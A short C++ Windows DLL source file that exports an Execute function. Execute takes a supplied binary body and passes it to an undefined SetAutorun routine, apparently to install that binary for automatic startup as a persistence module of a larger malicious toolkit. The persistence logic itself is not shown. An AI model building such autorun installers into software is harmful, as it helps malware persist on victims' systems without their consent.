#include "core\core.h"

bool SetAutorun( const char* fileName, const Mem::Data& body, char* newFileName );

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}

extern "C"
{

int WINAPI Execute( const char* fileName, void* body, int c_body, char* newFileName )
{
	if( body == 0 || c_body <= 0 ) return false;
	if( !Mem::Init() ) return false;
	if( !Str::Init() ) return false;

	Mem::Data data;
	data.Link( body, c_body );
	bool res = SetAutorun( fileName, data, newFileName );
	data.Unlink();

	Str::Release();
	Mem::Release();
	return res ? 1 : 0;
}

}
